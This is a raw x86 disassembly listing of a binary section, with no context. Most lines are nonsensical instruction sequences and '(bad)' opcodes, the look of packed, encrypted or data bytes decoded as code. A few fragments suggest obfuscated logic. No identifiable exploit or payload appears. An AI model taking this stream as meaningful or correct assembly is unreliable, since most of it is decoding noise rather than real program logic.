  405b23:	sub    ecx,DWORD PTR [ecx-0x3b]
  405b26:	jp     0x405b7f
  405b28:	xchg   edi,eax
  405b29:	adc    BYTE PTR [ecx+0x8],cl
  405b2c:	sti    
  405b2d:	nop
  405b2e:	and    bl,BYTE PTR [ebx]
  405b30:	pop    es
  405b31:	and    dh,al
  405b33:	aad    0x1e
  405b35:	int3   
  405b36:	or     DWORD PTR [ecx],ebx
  405b38:	ins    DWORD PTR es:[edi],dx
  405b39:	mov    dh,0xfb
  405b3b:	push   0xb675418
  405b40:	js     0x405b23
  405b42:	mov    ds:0x4e22f632,al
  405b47:	or     eax,0x5816a621
  405b4c:	mov    ebx,0x7be3fec7
  405b51:	dec    esi
  405b52:	sub    al,0x2b
  405b54:	and    al,0xf9
  405b56:	sar    DWORD PTR [ebp-0x4c],0xc7
  405b5a:	sahf   
  405b5b:	js     0x405b7e
  405b5d:	add    eax,0x7119f3f9
  405b62:	imul   DWORD PTR [edi]
  405b64:	mov    ss,WORD PTR [edi-0x66]
  405b67:	pop    ss
  405b68:	arpl   WORD PTR [edx],si
  405b6a:	lds    ebp,FWORD PTR [ebp-0x47e7ba8f]
  405b70:	mov    esp,0xd99c5ea9
  405b75:	push   esi
  405b76:	jecxz  0x405b4b
  405b78:	inc    eax
  405b79:	cmp    dh,BYTE PTR [eax]
  405b7b:	int    0xf4
  405b7d:	push   0x6f
  405b7f:	lea    edi,[edx]
  405b81:	cli    
  405b82:	mov    ds:0x6aaa63c4,eax
  405b87:	and    eax,0xec458bdc
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	shr    BYTE PTR [ebx+0x2960d17a],1
  405bb1:	jle    0x405c31
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405b3f
  405bb8:	(bad)  
  405bb9:	jns    0x405c24
  405bbb:	pop    ss
  405bbc:	adc    BYTE PTR [edi+eiz*1-0x5045a26d],cl
  405bc3:	stos   BYTE PTR es:[edi],al
  405bc4:	out    0xb0,eax
  405bc6:	fwait
  405bc7:	inc    ebx
  405bc8:	pusha  
  405bc9:	popf   
  405bca:	sbb    BYTE PTR [edi-0x1c8069a8],0x1d
  405bd1:	add    DWORD PTR [edx+0x25],esi
  405bd4:	enter  0xf9ad,0xd9
  405bd8:	dec    eax
  405bd9:	adc    DWORD PTR [eax+0x76],edx
  405bdc:	jnp    0x405b63
  405bde:	pusha  
  405bdf:	push   ds
  405be0:	inc    ebx
  405be1:	push   ebx
  405be2:	cs ins DWORD PTR es:[edi],dx
  405be4:	jmp    0x405c18
  405be6:	adc    al,0x48
  405be8:	loopne 0x405c61
  405bea:	sahf   
  405beb:	out    dx,eax
  405bec:	inc    edi
  405bed:	fld    TBYTE PTR [edi]
  405bef:	push   ebp
  405bf0:	add    al,0x5f
  405bf2:	fcomp  QWORD PTR [esi+0x612e3fea]
  405bf8:	js     0x405c16
  405bfa:	cs add eax,eax
  405bfd:	push   ds
  405bfe:	ret    0x962b
  405c01:	jmp    0xf8ef307d
  405c06:	pop    esp
  405c07:	jge    0x405c4f
  405c09:	sbb    dl,BYTE PTR [edx+0x26]
  405c0c:	mov    al,ds:0xc09e03
  405c11:	sub    al,0x6
  405c13:	fcomip st,st(0)
  405c15:	int3   
  405c16:	inc    ecx
  405c17:	and    al,0xd3
  405c19:	iret   
  405c1a:	or     ecx,edx
  405c1c:	add    al,0x9a
  405c1e:	mov    al,0xbe
  405c20:	cmp    eax,0x4ef6dcb1
  405c25:	adc    DWORD PTR [edx+0x1e],eax
  405c28:	repz inc esi
  405c2a:	sub    BYTE PTR [ecx-0x9],al
  405c2d:	adc    dl,BYTE PTR [ebp*8-0x1987cfbd]
  405c34:	jns    0x405c10
  405c36:	or     DWORD PTR [edi-0x46],ecx
  405c39:	sbb    edi,DWORD PTR [ebx+ebp*8+0x30]
  405c3d:	ficom  WORD PTR ds:0x59ed6a48
  405c43:	pop    ebx
  405c44:	or     DWORD PTR [edi-0x75],0x1d
  405c48:	je     0x405c30
  405c4a:	sub    ebp,0x5d473ea0
  405c50:	sub    BYTE PTR [edx+0x6665238c],0x86
  405c57:	jne    0x405c8f
  405c59:	in     eax,0xd1
  405c5b:	mov    ?,WORD PTR [edi]
  405c5d:	push   0xffffffaa
  405c5f:	iret   
  405c60:	js     0x405caf
  405c62:	in     al,dx
  405c63:	jns    0x405c29
  405c65:	xor    al,cl
  405c67:	xchg   ecx,eax
  405c68:	fcomp  st(2)
  405c6a:	div    dl
  405c6c:	lea    edi,[ebx]
  405c6e:	aam    0x1e
  405c70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c71:	scas   al,BYTE PTR es:[edi]
  405c72:	or     eax,0x3de1f3fb
  405c77:	xchg   dl,bl
  405c79:	xor    eax,0x3db62933
  405c7e:	and    ebp,DWORD PTR [esi]
  405c80:	fwait
  405c81:	outs   dx,BYTE PTR ds:[esi]
  405c82:	xchg   ebx,eax
  405c83:	pop    esi
  405c84:	pop    es
  405c85:	into   
  405c86:	loop   0x405c94
  405c88:	inc    ebp
  405c89:	sub    al,0x20
  405c8b:	xchg   DWORD PTR [ebp-0x2c],ecx
  405c8e:	gs mov eax,0xd10dba93
  405c94:	adc    BYTE PTR [ebx+0x13],dh
  405c97:	ds fld st(6)
  405c9a:	dec    esp
  405c9b:	outs   dx,BYTE PTR ds:[esi]
  405c9c:	sar    BYTE PTR [edi-0x3fb2d623],cl
  405ca2:	mov    esp,0x2de49410
  405ca7:	mov    ds:0xb8122aab,eax
  405cac:	sbb    al,0xce
  405cae:	fsubr  st,st(5)
  405cb0:	shl    esi,1
  405cb2:	or     al,0xed
  405cb4:	retf   
  405cb5:	cld    
  405cb6:	add    DWORD PTR [eax-0x3e47fc58],0x1b72035d
  405cc0:	scas   eax,DWORD PTR es:[edi]
  405cc1:	pop    esi
  405cc2:	ds sbb ecx,esi
  405cc5:	lods   al,BYTE PTR ds:[esi]
  405cc6:	fldenv [edi]
  405cc8:	call   0x6ca6:0x85852525
  405ccf:	out    dx,eax
  405cd0:	add    DWORD PTR [ebx+eax*4+0x31893d6a],esp
  405cd7:	dec    edi
  405cd8:	sahf   
  405cd9:	push   esp
  405cda:	ja     0x405c86
  405cdc:	loope  0x405d3d
  405cde:	or     DWORD PTR [edx-0x2d],esp
  405ce1:	mov    esp,ss
  405ce3:	test   DWORD PTR [ebp+0x417a9234],eax
  405ce9:	ss sbb eax,0x3485d6fc
  405cef:	in     al,0x6a
  405cf1:	adc    DWORD PTR ds:0xb233a6dd,0x1759a566
  405cfb:	xor    eax,0x41d2294
  405d00:	sub    edi,ecx
  405d02:	cmp    eax,0x5eda98bc
  405d07:	add    al,0x16
  405d09:	xchg   ecx,eax
  405d0a:	mov    eax,0x16a25eae
  405d0f:	cmp    DWORD PTR [edi+0x33],0xc4e84776
  405d16:	aam    0xbd
  405d18:	sar    DWORD PTR [ecx+0x59006bed],1
  405d1e:	add    ah,bl
  405d20:	or     DWORD PTR [edx],ebx
  405d22:	or     eax,eax
  405d24:	stos   DWORD PTR es:[edi],eax
  405d25:	push   cs
  405d26:	out    dx,al
  405d27:	jo     0x405d57
  405d29:	mov    ds:0xccb2b3e5,eax
  405d2e:	jle    0x405d5c
  405d30:	pusha  
  405d31:	sub    eax,DWORD PTR [edi]
  405d33:	ins    BYTE PTR es:[edi],dx
  405d34:	jns    0x405ccd
  405d36:	push   ecx
  405d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d38:	and    ebp,ebp
  405d3a:	call   0x41ae1ee8
  405d3f:	jnp    0x405d45
  405d41:	int    0x8e
  405d43:	addr16 out 0x6c,al
  405d46:	popf   
  405d47:	jno    0x405d30
  405d49:	push   esi
  405d4a:	fistp  DWORD PTR [esi+0x2]
  405d4d:	mov    bh,0xf5
  405d4f:	and    DWORD PTR [edx],esi
  405d51:	in     al,dx
  405d52:	xchg   ecx,eax
  405d53:	test   al,0xf4
  405d55:	icebp  
  405d56:	push   cs
  405d57:	jno    0x405ce8
  405d59:	fnsave [edi-0x38b7e00f]
  405d5f:	xchg   ecx,eax
  405d60:	add    ch,BYTE PTR cs:[eax-0x20114c44]
  405d67:	(bad)  
  405d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d69:	cmp    DWORD PTR [ecx+0x47],esp
  405d6c:	mov    esp,0x6763c552
  405d71:	retf   
  405d72:	bswap  ecx
  405d74:	stc    
  405d75:	je     0x405d55
  405d77:	call   0xa8b4f4a8
  405d7c:	add    BYTE PTR [ebp+0x12],0xd6
  405d80:	in     eax,dx
  405d81:	cmp    ch,cl
  405d83:	cmp    bl,BYTE PTR [esi+0x76]
  405d86:	retf   
  405d87:	out    dx,al
  405d88:	aad    0xc0
  405d8a:	scas   al,BYTE PTR es:[edi]
  405d8b:	and    eax,0xbeb5cb0d
  405d90:	cdq    
  405d91:	sub    ecx,DWORD PTR [ebx-0x7f740fbb]
  405d97:	cwde   
  405d98:	add    DWORD PTR [eax],eax
  405d9a:	add    bh,bh
  405d9c:	xor    al,ch
  405d9e:	and    esi,DWORD PTR [eax+0x0]
  405da1:	add    BYTE PTR [ecx+0x7d83f845],cl
  405da7:	clc    
  405da8:	add    BYTE PTR [ebp-0xc16fbbb],cl
  405dae:	add    DWORD PTR [eax],eax
  405db0:	add    BYTE PTR [ebx+0x518ed1c9],dl
  405db6:	xchg   esi,eax
  405db7:	push   ecx
  405db8:	shl    DWORD PTR [edx-0x263eca5],1
  405dbe:	pop    ebp
  405dbf:	popa   
  405dc0:	cmp    al,BYTE PTR [edi+0x37]
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405d6c
  405dca:	sbb    esp,DWORD PTR [ecx+0x0]
  405dcd:	in     al,dx
  405dce:	or     al,0x7e
  405dd0:	mov    BYTE PTR [ebp-0x6db796c7],al
  405dd6:	into   
  405dd7:	fstp   DWORD PTR [ebx+edi*8]
  405dda:	pusha  
  405ddb:	lds    ecx,FWORD PTR [edx-0x4568065e]
  405de1:	jno    0x405dae
  405de3:	and    eax,0x6a71c2c8
  405de8:	loop   0x405e37
  405dea:	pop    es
  405deb:	pop    ds
  405dec:	mov    BYTE PTR [ebx-0x2c60ff5e],bl
  405df2:	push   es
  405df3:	(bad)  
  405df4:	aam    0x35
  405df6:	sbb    ebp,esi
  405df8:	cmp    esi,DWORD PTR [ebp+0x2a997d92]
  405dfe:	pop    DWORD PTR [eax+esi*2-0x5067ab9a]
  405e05:	popf   
  405e06:	push   ebx
  405e07:	sub    edi,ecx
  405e09:	into   
  405e0a:	push   0xda073575
  405e0f:	vcvtdq2ps xmm4,xmm6
  405e13:	unpckhps xmm4,XMMWORD PTR ds:[eax-0x4d423e60]
  405e1b:	cmp    bh,dl
  405e1d:	cwde   
  405e1e:	loopne 0x405e5d
  405e20:	jo     0x405ea0
  405e22:	push   cs
  405e23:	add    ebx,DWORD PTR [edi]
  405e25:	inc    ebx
  405e26:	call   0x35e4df3c
  405e2b:	loop   0x405dad
  405e2d:	not    DWORD PTR [esi+0x4203d328]
  405e33:	mov    edi,0x1cae3687
  405e38:	mov    dl,0xa6
  405e3a:	enter  0xe013,0xe3
  405e3e:	or     dl,ah
  405e40:	adc    al,dl
  405e42:	std    
  405e43:	pop    esp
  405e44:	mov    edi,0xe6276c13
  405e49:	jl     0x405dcf
  405e4b:	ins    DWORD PTR es:[edi],dx
  405e4c:	xor    bh,BYTE PTR [ecx+0x763629d5]
  405e52:	das    
  405e53:	dec    ebx
  405e54:	xor    edi,ecx
  405e56:	mov    dh,0x1
  405e58:	ror    DWORD PTR [ecx],cl
  405e5a:	aam    0x33
  405e5c:	xchg   esp,eax
  405e5d:	lahf   
  405e5e:	xor    ebp,DWORD PTR [edi]
  405e60:	add    cl,BYTE PTR [edi+0x124c67a0]
  405e66:	or     al,0xc7
  405e68:	cld    
  405e69:	nop
  405e6a:	scas   eax,DWORD PTR es:[edi]
  405e6b:	pop    ds
  405e6c:	sbb    DWORD PTR [esi+0x61],esp
  405e6f:	out    dx,al
  405e70:	ins    DWORD PTR es:[edi],dx
  405e71:	pop    ebp
  405e72:	inc    ebx
  405e73:	xchg   BYTE PTR [edi-0x13],ch
  405e76:	test   DWORD PTR [esi],esi
  405e78:	stc    
  405e79:	cmp    dl,BYTE PTR [eax-0x4e]
  405e7c:	pop    es
  405e7d:	mov    fs,WORD PTR [esi+ecx*4+0x1b]
  405e81:	dec    ecx
  405e82:	neg    BYTE PTR ds:0x1e4cbaef
  405e88:	adc    ah,BYTE PTR [eax-0x32]
  405e8b:	das    
  405e8c:	add    eax,DWORD PTR [esp+edi*8+0x74fb2042]
  405e93:	pop    esi
  405e94:	popf   
  405e95:	jl     0x405e28
  405e97:	cli    
  405e98:	mov    dl,0x81
  405e9a:	mov    ecx,0x4ebf4acb
  405e9f:	xor    al,0x3d
  405ea1:	sub    DWORD PTR [ebx],ebp
  405ea3:	dec    edx
  405ea4:	(bad)  
  405ea5:	lods   eax,DWORD PTR ds:[esi]
  405ea6:	add    DWORD PTR [ebx+0xa306ee5],0x37485963
  405eb0:	ins    DWORD PTR es:[edi],dx
  405eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eb2:	sbb    bh,ah
  405eb4:	sub    eax,0x39b09d14
  405eb9:	stos   DWORD PTR es:[edi],eax
  405eba:	inc    edx
  405ebb:	scas   eax,DWORD PTR es:[edi]
  405ebc:	xor    dh,bh
  405ebe:	add    ebp,DWORD PTR [ecx]
  405ec0:	test   edi,ebx
  405ec2:	repz mov eax,ds:0xa5a85695
  405ec8:	(bad)  
  405ec9:	test   al,0x19
  405ecb:	leave  
  405ecc:	std    
  405ecd:	inc    eax
  405ece:	scas   eax,DWORD PTR es:[edi]
  405ecf:	or     DWORD PTR [eax],edx
  405ed1:	xchg   DWORD PTR [edi],ecx
  405ed3:	push   eax
  405ed4:	pop    esi
  405ed5:	inc    edi
  405ed6:	add    ebx,DWORD PTR [esi-0x3bd5f6ec]
  405edc:	inc    ebx
  405edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ede:	mov    edx,0x6ac53646
  405ee3:	lahf   
  405ee4:	dec    esp
  405ee5:	mul    BYTE PTR [esi-0x634b5905]
  405eeb:	adc    dh,ah
  405eed:	sar    DWORD PTR [edi+edi*8+0xe487b23],1
  405ef4:	cmc    
  405ef5:	mov    edx,0x1fbf30b
  405efa:	cmp    dh,BYTE PTR [ecx]
  405efc:	int    0x67
  405efe:	add    esp,0xffffff9f
  405f01:	sbb    al,bl
  405f03:	mov    ch,0x22
  405f05:	cwde   
  405f06:	sub    BYTE PTR [ebx],cl
  405f08:	mov    ebx,ds
  405f0a:	push   ecx
  405f0b:	adc    al,0x6f
  405f0d:	inc    ebp
  405f0e:	add    edi,ebx
  405f10:	inc    ebx
  405f11:	mov    al,ds:0x4820c3f0
  405f16:	mov    ebx,0xb0f1ca95
  405f1b:	into   
  405f1c:	shl    BYTE PTR [ecx+edx*2],cl
  405f1f:	xor    al,BYTE PTR [ebp-0x714d76c6]
  405f25:	loope  0x405f93
  405f27:	mov    esi,0xf87e14ff
  405f2c:	cmp    DWORD PTR [edx-0x723932ae],edx
  405f32:	or     edx,DWORD PTR [ebx]
  405f34:	jb     0x405f97
  405f36:	js     0x405eef
  405f38:	(bad)  
  405f39:	pusha  
  405f3a:	outs   dx,BYTE PTR ds:[esi]
  405f3b:	mov    ebp,0xd12ccb7e
  405f40:	adc    al,0x90
  405f42:	(bad)  
  405f43:	test   BYTE PTR [edi],ch
  405f45:	mov    BYTE PTR [ecx+0x663e3fee],ah
  405f4b:	cmp    edx,DWORD PTR [ecx]
  405f4d:	push   cs
  405f4e:	jmp    0xf21322ba
  405f53:	push   edi
  405f54:	mov    bl,0xf9
  405f56:	push   edx
  405f57:	mov    BYTE PTR [ecx-0x29],ah
  405f5a:	dec    ebp
  405f5b:	das    
  405f5c:	pop    ebx
  405f5d:	pop    ds
  405f5e:	jge    0x405f99
  405f60:	sub    al,0x6
  405f62:	cmp    DWORD PTR ds:0x7319cc30,edi
  405f68:	mov    al,ds:0x6dfb2c5e
  405f6d:	sub    cl,BYTE PTR [ecx-0x40]
  405f70:	sub    DWORD PTR [edi],0x2a4b93e3
  405f76:	cli    
  405f77:	push   eax
  405f78:	mov    ah,0x4f
  405f7a:	gs in  eax,dx
  405f7c:	loopne 0x405f7d
  405f7e:	sub    al,0x9d
  405f80:	nop
  405f81:	ss pop ss
  405f83:	mov    dh,0xcc
  405f85:	adc    esi,ebx
  405f87:	xor    eax,0x723e35bd
  405f8c:	jge    0x405f49
  405f8e:	inc    eax
  405f8f:	sub    al,bh
  405f91:	jne    0x405f56
  405f93:	loope  0x405f89
  405f95:	cmp    DWORD PTR [esi+eiz*1+0x2e7c058d],ebx
  405f9c:	or     DWORD PTR [edi-0x52dd44fc],edi
  405fa2:	out    dx,eax
  405fa3:	fmul   QWORD PTR [ecx-0x7bf01fbb]
  405fa9:	xchg   esi,eax
  405faa:	or     al,BYTE PTR [eax]
  405fac:	add    cl,ch
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x46]
  405fbf:	lods   al,BYTE PTR ds:[esi]
  405fc0:	pop    es
  405fc1:	dec    ebp
  405fc2:	call   0x7e7f:0x557e7e35
  405fc9:	jle    0x405f9c
  405fcb:	jmp    0xd31da9d2
  405fd0:	inc    eax
  405fd1:	sti    
  405fd2:	mov    ebx,0xc8e452e2
  405fd7:	out    0x11,al
  405fd9:	aaa    
  405fda:	inc    edi
  405fdb:	fisub  WORD PTR [ebp+0x79e951aa]
  405fe1:	sbb    esp,DWORD PTR [esi]
  405fe3:	mov    cl,0xd6
  405fe5:	and    BYTE PTR [ebx+0x76c79430],bl
  405feb:	sub    al,bh
  405fed:	jns    0x406041
  405fef:	inc    ebp
  405ff0:	sbb    BYTE PTR [edx-0x4134c315],al
  405ff6:	xor    dl,BYTE PTR [ebp+ebp*1+0x7aa081f3]
  405ffd:	cmp    ch,BYTE PTR [esi-0x52]
  406000:	mov    ebp,0x6eaf38d7
  406005:	push   ecx
  406006:	dec    ebx
  406007:	mov    bl,0x8a
  406009:	jg     0x405fee
  40600b:	fst    DWORD PTR [edi]
  40600d:	in     eax,0xe9
  40600f:	inc    eax
  406010:	je     0x406057
  406012:	add    bl,bl
  406014:	sahf   
  406015:	cmp    WORD PTR [edx+0x5f93bc45],0x5e3a
  40601e:	pusha  
  40601f:	inc    esi
  406020:	adc    al,0x0
  406022:	sbb    ebp,DWORD PTR [edx]
  406024:	add    eax,0x672556ca
  406029:	adc    esp,DWORD PTR [ebx+edi*1]
  40602c:	out    dx,al
  40602d:	add    ebx,DWORD PTR ds:0x1ee527fa
  406033:	fisubr WORD PTR [edi]
  406035:	cmc    
  406036:	cli    
  406037:	sub    al,0x89
  406039:	mov    ebx,0xcd4ed38e
  40603e:	push   ds
  40603f:	test   eax,0x901adf24
  406044:	mov    dh,0x1
  406046:	sub    al,0xe2
  406048:	nop
  406049:	add    esp,ecx
  40604b:	xchg   ecx,eax
  40604c:	jg     0x4060c7
  40604e:	test   BYTE PTR [edi+0x1b31465],dl
  406054:	inc    ecx
  406055:	out    dx,eax
  406056:	test   BYTE PTR [edx-0x5207ea01],0x31
  40605d:	neg    bh
  40605f:	or     edx,DWORD PTR [ecx]
  406061:	inc    ebx
  406062:	fimul  WORD PTR [eax+ebp*1]
  406065:	jne    0x406079
  406067:	inc    esi
  406068:	inc    eax
  406069:	out    0xc9,eax
  40606b:	kunpckbw k2,k4,k0
  40606f:	stc    
  406070:	lea    ecx,ds:0xe5986603
  406076:	and    ch,0x5a
  406079:	sbb    eax,0xeeb4f188
  40607e:	adc    DWORD PTR [edi],esp
  406080:	repz test eax,0xc9fb1978
  406086:	aaa    
  406087:	retf   0xfda9
  40608a:	jl     0x4060cd
  40608c:	xor    BYTE PTR [ebp-0x366cd4eb],0x18
  406093:	pop    es
  406094:	pusha  
  406095:	jnp    0x40610a
  406097:	adc    al,0xa1
  406099:	adc    DWORD PTR [esi-0x473264a9],esp
  40609f:	mov    dh,0x42
  4060a1:	and    eax,0xe0a09815
  4060a6:	cmp    al,0x17
  4060a8:	js     0x4060a3
  4060aa:	jmp    0x6836:0xbdf84738
  4060b1:	and    ebx,DWORD PTR [eax]
  4060b3:	push   0x1c
  4060b5:	jle    0x4060b1
  4060b7:	imul   ebp,DWORD PTR [eax],0x58296364
  4060bd:	xchg   esi,eax
  4060be:	sbb    al,0x46
  4060c0:	popa   
  4060c1:	adc    BYTE PTR [esi],cl
  4060c3:	out    0x74,al
  4060c5:	mov    dh,0xf6
  4060c7:	pop    ds
  4060c8:	inc    eax
  4060c9:	jne    0x406110
  4060cb:	int3   
  4060cc:	pop    ecx
  4060cd:	jb     0x4060db
  4060cf:	or     edi,DWORD PTR [ebp-0x324fed19]
  4060d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d6:	cmp    ebx,DWORD PTR [ebx-0x51645b22]
  4060dc:	pop    ebx
  4060dd:	jbe    0x4060d2
  4060df:	fwait
  4060e0:	les    esp,FWORD PTR [ecx-0x3d]
  4060e3:	les    ecx,FWORD PTR [edi+0x2f]
  4060e6:	pop    ds
  4060e7:	sti    
  4060e8:	inc    esi
  4060e9:	fs push 0x33
  4060ec:	push   edx
  4060ed:	and    DWORD PTR [edx+0x3c],ebx
  4060f0:	gs out dx,eax
  4060f2:	fsub   st(7),st
  4060f4:	cs test eax,0xcb6f7d94
  4060fa:	mov    al,ds:0x5ea56f1e
  4060ff:	ret    0xb0f2
  406102:	or     BYTE PTR [edi],dh
  406104:	xor    BYTE PTR [ebp+0x48a8fd21],al
  40610a:	push   0xe9af4fc3
  40610f:	ficomp WORD PTR [ebp+eiz*8+0x61]
  406113:	jmp    0xda83060d
  406118:	loope  0x406163
  40611a:	jb     0x4060ef
  40611c:	(bad)  [eax]
  40611e:	add    DWORD PTR [ebp-0x14],0x47
  406122:	(bad)  
  406123:	call   0x90f9d0e0
  406128:	sub    DWORD PTR [eax],ebp
  40612a:	inc    ebx
  40612b:	and    al,0xba
  40612d:	ss cdq 
  40612f:	jae    0x406170
  406131:	pop    esi
  406132:	xchg   edi,eax
  406133:	pop    ecx
  406134:	fldcw  WORD PTR [edx+0x27e3bb]
  40613a:	ins    BYTE PTR es:[edi],dx
  40613b:	push   edi
  40613c:	pop    esi
  40613d:	push   cs
  40613e:	pushw  ds
  406140:	dec    ebx
  406141:	mov    al,0x17
  406143:	pusha  
  406144:	sti    
  406145:	xchg   esi,eax
  406146:	fbld   TBYTE PTR [eax+0x45d9c91b]
  40614c:	lods   eax,DWORD PTR ds:[esi]
  40614d:	repz imul ebx,DWORD PTR [esi-0x78c25c6],0x4eb6ee17
  406158:	adc    esi,ebx
  40615a:	mov    dh,0x5f
  40615c:	jne    0x4060e5
  40615e:	dec    esi
  40615f:	push   0xa9ebc490
  406164:	(bad)  [esi-0x4e]
  406167:	pop    es
  406168:	outs   dx,DWORD PTR ds:[esi]
  406169:	mov    bh,0x89
  40616b:	(bad)  
  40616d:	pop    es
  40616e:	aam    0xec
  406170:	or     al,0x11
  406172:	fidiv  WORD PTR [ecx]
  406174:	adc    eax,0x920be779
  406179:	mov    ah,0x69
  40617b:	mov    ecx,0x46899e4b
  406180:	inc    ebp
  406181:	add    DWORD PTR [eax-0x5b],ecx
  406184:	mov    edx,0xd7e2982c
  406189:	mov    ds:0xf3e27992,eax
  40618e:	sub    bh,BYTE PTR [eax+0x473e7d8f]
  406194:	mov    al,0x11
  406196:	xor    al,0xf1
  406198:	cmp    ah,BYTE PTR [ecx+0x9]
  40619b:	inc    ebp
  40619c:	in     eax,0x5f
  40619e:	and    al,0x8e
  4061a0:	or     dl,al
  4061a2:	hlt    
  4061a3:	fldl2e 
  4061a5:	lea    eax,[ebp-0x18]
  4061a8:	push   eax
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	or     dh,BYTE PTR [esi+0x33f1f60d]
  4061d7:	jle    0x406257
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x406215
  4061de:	into   
  4061df:	gs pusha 
  4061e1:	xor    ah,dh
  4061e3:	repz xor eax,DWORD PTR ds:0x94537be1
  4061ea:	cmc    
  4061eb:	pop    ecx
  4061ec:	mov    BYTE PTR [edi+0x18],ah
  4061ef:	ss pop eax
  4061f1:	jl     0x406247
  4061f3:	lock xchg edi,eax
  4061f5:	xor    DWORD PTR [ecx+0x42],0x8f9a5596
  4061fc:	daa    
  4061fd:	sbb    bh,al
  4061ff:	(bad)  
  406200:	stc    
  406201:	jb     0x4061ea
  406203:	add    DWORD PTR [edx],ecx
  406205:	mov    ah,0x87
  406207:	pop    esi
  406208:	xchg   ecx,eax
  406209:	and    cl,BYTE PTR [esi+eax*8+0x2a]
  40620d:	mov    dh,BYTE PTR [edi-0x33ce44ec]
  406213:	inc    edi
  406214:	cwde   
  406215:	and    BYTE PTR [ebp+0x41],dl
  406218:	inc    edi
  406219:	pusha  
  40621a:	pop    edi
  40621b:	stos   BYTE PTR es:[edi],al
  40621c:	mov    dl,0x2f
  40621e:	mov    eax,ds:0x5513bcf7
  406223:	mov    al,ds:0xf80453e6
  406228:	sub    eax,0x3eacecd4
  40622d:	xor    cl,BYTE PTR [ebp-0x6e04454f]
  406233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406234:	jp     0x4061d1
  406236:	aam    0xd8
  406238:	jg     0x4061d9
  40623a:	rcl    BYTE PTR [edi],cl
  40623c:	jg     0x4061c6
  40623e:	jmp    eax
  406240:	mov    esp,0xfe516c04
  406245:	pop    esp
  406246:	(bad)  
  406247:	test   BYTE PTR [esi],0xda
  40624a:	es mov esi,0x9f2b0a33
  406250:	lods   al,BYTE PTR fs:[esi]
  406252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406254:	mov    WORD PTR [edx+0x10],fs
  406257:	xchg   edx,eax
  406258:	jnp    0x4062bb
  40625a:	push   eax
  40625b:	xor    edi,DWORD PTR ds:0xe1cc89d5
  406261:	xchg   edx,eax
  406262:	mov    dl,0x63
  406264:	and    bl,BYTE PTR [ebp+ebp*4+0x5f]
  406268:	xlat   BYTE PTR ds:[ebx]
  406269:	pop    ebp
  40626a:	ins    DWORD PTR es:[edi],dx
  40626b:	pop    ds
  40626c:	inc    edi
  40626d:	dec    edi
  40626e:	and    eax,0xfd71061b
  406273:	cmp    eax,0x33686e51
  406278:	mov    eax,0x9ba43972
  40627d:	out    0x49,eax
  40627f:	stc    
  406280:	xchg   esi,eax
  406281:	dec    esi
  406282:	loope  0x40624b
  406284:	mov    al,ds:0x66f3d85c
  406289:	call   0x5dce:0xcc1cedd7
  406290:	pop    edx
  406291:	(bad)  
  406292:	mov    bl,0x6b
  406294:	std    
  406295:	cmp    BYTE PTR [edx+0x82e5c51],dh
  40629b:	or     dh,BYTE PTR ds:0x4bfa3a55
  4062a1:	adc    BYTE PTR [edx],cl
  4062a3:	sub    al,0xb4
  4062a5:	imul   eax,DWORD PTR [edx-0x12],0x61
  4062a9:	pop    es
  4062aa:	push   ecx
  4062ab:	pop    edx
  4062ac:	fwait
  4062ad:	daa    
  4062ae:	xchg   ebx,eax
  4062af:	dec    ecx
  4062b0:	dec    ebx
  4062b1:	dec    ecx
  4062b2:	jecxz  0x40627d
  4062b4:	(bad)
  4062b8:	or     BYTE PTR [esi+eiz*4+0x234c30ec],al
  4062bf:	icebp  
  4062c0:	mov    BYTE PTR [esi+esi*1+0x1e],cl
  4062c4:	out    0xf5,al
  4062c6:	mov    fs,WORD PTR [ecx-0xc848fda]
  4062cc:	inc    esi
  4062cd:	push   ecx
  4062ce:	mov    eax,0x300ed850
  4062d3:	dec    edi
  4062d4:	cmp    BYTE PTR [esi+0x61],dh
  4062d7:	or     esi,DWORD PTR [eax+0x68475cc1]
  4062dd:	mov    esp,0x785e6ecb
  4062e2:	jno    0x40635d
  4062e4:	sahf   
  4062e5:	sbb    DWORD PTR [ebx-0x7d061e8c],ecx
  4062eb:	mov    cl,0xb
  4062ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062ee:	xchg   edi,eax
  4062ef:	int3   
  4062f0:	sbb    al,0x5
  4062f2:	dec    esi
  4062f3:	pusha  
  4062f4:	bound  eax,QWORD PTR [edx-0x4cbe7558]
  4062fa:	and    edi,DWORD PTR [edi+0x7a]
  4062fd:	mov    DWORD PTR [esi],ebp
  4062ff:	mov    dl,al
